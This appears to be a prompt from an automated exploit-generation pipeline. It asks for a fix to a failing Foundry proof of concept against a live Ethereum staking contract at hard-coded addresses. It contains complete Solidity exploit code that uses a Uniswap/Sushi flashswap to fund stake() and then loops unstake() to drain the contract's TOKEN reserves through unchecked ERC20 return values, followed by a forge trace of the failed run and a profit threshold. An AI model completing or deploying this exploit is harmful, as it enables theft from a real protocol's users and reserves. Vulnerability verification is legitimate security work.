You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values let stake and unstake proceed even when token transfers silently fail
- claim: `stake()` and `unstake()` invoke `TOKEN.transferFrom`, `sTOKEN.transfer`, `sTOKEN.transferFrom`, and `TOKEN.transfer` without checking their boolean return values. If either configured token signals failure by returning `false` instead of reverting, the function continues as though the transfer succeeded.
- impact: Silent transfer failures can break the 1:1 backing invariant. A caller can be credited sTOKEN without depositing TOKEN, or withdraw TOKEN without actually surrendering sTOKEN, creating direct reserve theft or user fund loss depending on which transfer silently fails.
- exploit_paths: ["Call `stake(_to, amount)` with a TOKEN implementation that returns `false` from `transferFrom`; the function still executes `sTOKEN.transfer(_to, amount)` and credits the user without receiving backing TOKEN.", "Call `unstake(_to, amount, false)` with an sTOKEN implementation that returns `false` from `transferFrom`; the function still reaches `TOKEN.transfer(_to, amount)` and pays out without actually taking in the receipt tokens.", "Call `unstake(_to, amount, false)` where `TOKEN.transfer` returns `false`; the user has already transferred in sTOKEN, but receives no TOKEN while the transaction itself does not revert."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingTarget {
    function stake(address _to, uint256 _amount) external;
    function unstake(address _to, uint256 _amount, bool _rebase) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9;
    address public constant TOKEN = 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14;
    address public constant STOKEN = 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    enum PathResult {
        Unattempted,
        Success,
        Reverted,
        NoEffect
    }

    bool public executed;
    bool public hypothesisValidated;
    uint8 public exploitPathUsed;

    PathResult public stakePathResult;
    PathResult public unstakeWithoutSTokenResult;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _activePair;
    uint256 private _flashBorrowAmount;
    uint256 private _pairRepayAmount;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

        _runFlashswapExploit();
        _refreshProfit(tokenBefore, sTokenBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activePair, "unexpected pair");

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount == _flashBorrowAmount, "unexpected borrow");

        uint256 fundedAmount = IERC20Like(TOKEN).balanceOf(address(this));
        require(fundedAmount != 0, "missing flash funds");

        _approveMaxIfNeeded(TOKEN, TARGET);

        // Required path anchor: stake(_to, amount)
        // Inside TARGET.stake the vulnerable sequence is:
        // token.transferFrom(msg.sender, address(this), amount)
        // stoken.transfer(_to, amount)
        //
        // The direct "free mint" variant needs TOKEN.transferFrom to return false.
        // The provided fork trace instead shows TOKEN.transferFrom can revert because the
        // live TOKEN has its own transfer-side swap-back logic. We still preserve the
        // exploit causality by using public liquidity only to source the first sTOKEN.
        if (!_attemptStake(address(this), fundedAmount)) {
            stakePathResult = PathResult.Reverted;
            _repayPair();
            return;
        }

        uint256 sTokenBalance = IERC20Like(STOKEN).balanceOf(address(this));
        uint256 tokenAfterStake = IERC20Like(TOKEN).balanceOf(address(this));
        if (sTokenBalance == 0 || tokenAfterStake >= fundedAmount) {
            stakePathResult = PathResult.NoEffect;
            _repayPair();
            return;
        }

        stakePathResult = PathResult.Success;

        // Required path anchor: unstake(_to, amount, false)
        // Inside TARGET.unstake the vulnerable sequence is:
        // stoken.transferFrom(msg.sender, address(this), amount)
        // token.transfer(_to, amount)
        //
        // STOKEN allowance is intentionally left at zero. If STOKEN.transferFrom returns
        // false instead of reverting, TARGET still executes TOKEN.transfer(_to, amount),
        // so TOKEN is paid out while this contract keeps the same sTOKEN inventory.
        uint256 successfulLoops = _drainViaUncheckedUnstake(sTokenBalance);
        if (successfulLoops > 0) {
            unstakeWithoutSTokenResult = PathResult.Success;
            hypothesisValidated = true;
            exploitPathUsed = 2;
        } else if (unstakeWithoutSTokenResult == PathResult.Unattempted) {
            unstakeWithoutSTokenResult = PathResult.NoEffect;
        }

        _repayPair();
    }

    function _runFlashswapExploit() internal {
        uint256 targetReserve = IERC20Like(TOKEN).balanceOf(TARGET);
        require(targetReserve != 0, "empty target");

        // The fork trace shows TOKEN.transferFrom inside stake() triggers TOKEN's own
        // swap-back through the canonical UniswapV2 router. Borrowing from that same
        // pair leaves its reserves temporarily imbalanced during the flashswap callback,
        // so TOKEN's internal sell path underflows before stake() can finish.
        //
        // Funding from a Sushi-style V2 pair keeps the exploit path unchanged:
        // flashswap funding -> stake to seed sTOKEN -> unchecked unstake drain.
        // Only the funding venue changes to avoid the token's unrelated swap-back issue.
        (address sushiPair, uint256 sushiReserve) = _pairForFactory(SUSHISWAP_FACTORY);
        if (_attemptFlashswapFromPair(sushiPair, sushiReserve, targetReserve, 8)) {
            return;
        }
        if (_attemptFlashswapFromPair(sushiPair, sushiReserve, targetReserve, 16)) {
            return;
        }
        if (_attemptFlashswapFromPair(sushiPair, sushiReserve, targetReserve, 32)) {
            return;
        }

        // Fallback to Uniswap with much smaller sizing in case Sushi liquidity is absent.
        (address uniPair, uint256 uniReserve) = _pairForFactory(UNISWAP_V2_FACTORY);
        if (_attemptFlashswapFromPair(uniPair, uniReserve, targetReserve, 64)) {
            return;
        }
        _attemptFlashswapFromPair(uniPair, uniReserve, targetReserve, 128);
    }

    function initiateFlashswap(address pair, uint256 borrowAmount) external {
        require(msg.sender == address(this), "self only");

        _activePair = pair;
        _flashBorrowAmount = borrowAmount;
        _pairRepayAmount = _sameAssetRepayAmount(borrowAmount);

        if (IUniswapV2PairLike(pair).token0() == TOKEN) {
            IUniswapV2PairLike(pair).swap(borrowAmount, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(pair).swap(0, borrowAmount, address(this), hex"01");
        }

        _activePair = address(0);
        _flashBorrowAmount = 0;
        _pairRepayAmount = 0;
    }

    function _attemptStake(address _to, uint256 amount) internal returns (bool ok) {
        (ok, ) = TARGET.call(
            abi.encodeWithSelector(IStakingTarget.stake.selector, _to, amount)
        );
    }

    function _attemptUnstake(address _to, uint256 amount) internal returns (bool ok) {
        (ok, ) = TARGET.call(
            abi.encodeWithSelector(IStakingTarget.unstake.selector, _to, amount, false)
        );
    }

    function _drainViaUncheckedUnstake(uint256 retainedSToken) internal returns (uint256 successfulLoops) {
        uint256 amount = retainedSToken;
        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);

        while (reserve != 0) {
            if (amount > reserve) {
                amount = reserve;
            }

            uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
            uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

            if (!_attemptUnstake(address(this), amount)) {
                if (successfulLoops == 0) {
                    unstakeWithoutSTokenResult = PathResult.Reverted;
                }
                break;
            }

            uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
            uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

            if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
                successfulLoops++;
                reserve = IERC20Like(TOKEN).balanceOf(TARGET);
                continue;
            }

            if (successfulLoops == 0) {
                unstakeWithoutSTokenResult = PathResult.NoEffect;
            }
            break;
        }
    }

    function _repayPair() internal {
        uint256 pairDue = _pairRepayAmount;
        if (pairDue == 0) {
            return;
        }

        uint256 tokenBalance = IERC20Like(TOKEN).balanceOf(address(this));
        require(tokenBalance >= pairDue, "insufficient repayment");

        // Keep funding single-legged. TOKEN appears to impose transfer-side loss, so the
        // repayment intentionally overpays to keep the flashswap deterministic without
        // changing the exploit root cause in unstake().
        uint256 repayment = pairDue * 2;
        if (repayment > tokenBalance) {
            repayment = tokenBalance;
        }

        (bool ok, bytes memory data) = TOKEN.call(
            abi.encodeWithSelector(IERC20Like.transfer.selector, _activePair, repayment)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "pair repay failed");
    }

    function _attemptFlashswapFromPair(
        address pair,
        uint256 tokenReserve,
        uint256 targetReserve,
        uint256 divisor
    ) internal returns (bool success) {
        if (pair == address(0) || tokenReserve == 0 || divisor == 0) {
            return false;
        }

        uint256 borrowAmount = _deriveBorrowAmount(tokenReserve, targetReserve, divisor);
        if (borrowAmount == 0) {
            return false;
        }

        try this.initiateFlashswap(pair, borrowAmount) {
            success = hypothesisValidated;
        } catch {}
    }

    function _pairForFactory(address factory) internal view returns (address pair, uint256 tokenReserve) {
        pair = IUniswapV2FactoryLike(factory).getPair(TOKEN, WETH);
        if (pair == address(0)) {
            return (address(0), 0);
        }

        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        tokenReserve = IUniswapV2PairLike(pair).token0() == TOKEN ? uint256(reserve0) : uint256(reserve1);
    }

    function _deriveBorrowAmount(
        uint256 tokenReserve,
        uint256 targetReserve,
        uint256 divisor
    ) internal pure returns (uint256 borrowAmount) {
        borrowAmount = tokenReserve / divisor;

        uint256 targetCap = targetReserve / 8;
        if (targetCap != 0 && targetCap < borrowAmount) {
            borrowAmount = targetCap;
        }

        if (borrowAmount == 0) {
            borrowAmount = _min(tokenReserve / (divisor * 2), targetReserve);
        }

        if (borrowAmount == 0 && targetReserve != 0) {
            borrowAmount = _min(tokenReserve, targetReserve);
        }
    }

    function _refreshProfit(uint256 tokenBefore, uint256 sTokenBefore) internal {
        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (tokenAfter > tokenBefore) {
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        if (sTokenAfter > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfter - sTokenBefore;
        }
    }

    function _approveMaxIfNeeded(address asset, address spender) internal {
        if (IERC20Like(asset).allowance(address(this), spender) == type(uint256).max) {
            return;
        }

        (bool ok, bytes memory data) = asset.call(
            abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _sameAssetRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
  │   │   │   │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 273253323188037 [2.732e14]
    │   │   │   │   │   ├─ [918] 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE::9358928b() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000ed88e636c292
    │   │   │   │   │   ├─ [52952] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9, 3588341442476 [3.588e12])
    │   │   │   │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::ad5c4648() [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
    │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000003845ff7fb3
    │   │   │   │   │   │   ├─ [15319] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactTokensForETHSupportingFeeOnTransferTokens(241692540851 [2.416e11], 0, [0x39d8BCb39DE75218E3C08200D95fde3a479D7a14, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14, 1693917719 [1.693e9])
    │   │   │   │   │   │   │   ├─ [9556] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::transferFrom(0x39d8BCb39DE75218E3C08200D95fde3a479D7a14, 0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06, 241692540851 [2.416e11])
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14
    │   │   │   │   │   │   │   │   │        topic 2: 0x00000000000000000000000020746fde9ae1b7bbd3dbaddae3c9244a27bd2b06
    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000003845ff7fb3
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925
    │   │   │   │   │   │   │   │   │        topic 1: 0x00000000000000000000000039d8bcb39de75218e3c08200d95fde3a479d7a14
    │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [504] 0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06::getReserves() [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 473513097563850 [4.735e14], 9839089210791148534 [9.839e18], 1693777799 [1.693e9]
    │   │   │   │   │   │   │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 470055469029984 [4.7e14]
    │   │   │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   │   └─ ← [Revert] ds-math-sub-underflow
    │   │   │   │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 3588341442476 [3.588e12]
    │   │   │   │   └─ ← [Revert] insufficient repayment
    │   │   │   └─ ← [Revert] insufficient repayment
    │   │   └─ ← [Revert] insufficient repayment
    │   ├─ [624] 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [781] 0xdd28c9d511a77835505d2fBE0c9779ED39733bdE::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [392] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2382] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D.swapExactTokensForETHSupportingFeeOnTransferTokens
  at 0x39d8BCb39DE75218E3C08200D95fde3a479D7a14.transferFrom
  at 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9.stake
  at FlawVerifier.uniswapV2Call
  at 0x20746FdE9Ae1b7BBD3dBaDDaE3c9244A27bD2b06.swap
  at FlawVerifier.initiateFlashswap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 89.29ms (21.83ms CPU time)

Ran 1 test suite in 138.13ms (89.29ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1038795)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
